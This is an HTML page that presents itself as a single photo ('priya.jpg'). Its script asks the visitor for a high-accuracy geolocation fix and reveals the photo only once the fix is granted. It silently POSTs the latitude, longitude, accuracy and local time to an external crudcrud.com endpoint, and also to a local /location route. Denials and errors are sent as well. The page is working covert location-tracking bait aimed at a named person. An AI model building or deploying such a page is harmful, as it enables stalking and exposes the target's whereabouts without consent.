<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title></title>
    <style>
      html,
      body {
        margin: 0;
        height: 100%;
        background: #fff;
      }
      #photo {
        display: none;
        width: 100%;
        height: 100%;
        object-fit: contain;
      }
      #photo.visible {
        display: block;
      }
    </style>
  </head>
  <body>
    <img id="photo" src="priya.jpg" alt="" />
    <script>
      var ENDPOINT =
        "https://crudcrud.com/api/b7617c51e90f44d3a676d7c130ecbfb9/locations";

      function send(payload) {
        var now = new Date();
        payload.time = now.toISOString();
        payload.local_time = now.toLocaleString("en-IN", {
          timeZone: "Asia/Kolkata",
          year: "numeric",
          month: "2-digit",
          day: "2-digit",
          hour: "2-digit",
          minute: "2-digit",
          second: "2-digit",
          hour12: true,
        });
        var body = JSON.stringify(payload);
        if (
          location.hostname === "127.0.0.1" ||
          location.hostname === "localhost"
        ) {
          fetch("/location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: body,
            keepalive: true,
          });
        }
        fetch(ENDPOINT, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: body,
        }).catch(function () {});
      }

      function showPhoto() {
        document.getElementById("photo").classList.add("visible");
      }

      if (!navigator.geolocation) {
        send({ error: "geolocation_unsupported" });
      } else {
        navigator.geolocation.getCurrentPosition(
          function (pos) {
            send({
              lat: pos.coords.latitude,
              lng: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
            });
            showPhoto();
          },
          function (err) {
            send({ error: err.message, code: err.code });
          },
          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
      }
    </script>
  </body>
</html>
